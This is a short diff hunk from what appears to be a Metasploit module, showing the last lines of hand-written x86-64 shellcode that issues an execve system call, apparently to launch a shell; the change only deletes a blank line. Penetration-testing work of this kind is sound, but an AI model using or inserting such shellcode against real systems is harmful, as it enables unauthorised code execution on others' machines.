@@ -67,5 +67,4 @@ module MetasploitModule
       "\x48\x83\xc8\x3b" +                            # or rax, 0x3b (execve)
       "\x0f\x05"                                      # syscall
   end
-
 end
